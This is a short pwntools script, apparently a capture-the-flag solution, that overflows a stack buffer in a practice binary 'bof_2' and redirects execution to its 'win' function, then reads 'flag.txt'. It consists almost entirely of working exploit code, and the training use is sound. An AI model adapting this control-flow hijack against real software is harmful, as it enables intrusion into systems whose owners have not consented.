#!/usr/bin/env python3

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./bof_2")
r = ROP("./bof_2")

p = process("./bof_2")
#p = remote("localhost", 1337)
dbg = gdb.attach(p, gdbscript="""
    disass vuln
    b * vuln + 41
    b * vuln + 59
""")

payload = (32 + 8) * b"A"
payload += p64(r.ret.address)
payload += p64(exe.sym.win)
p.sendline(payload)
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.interactive()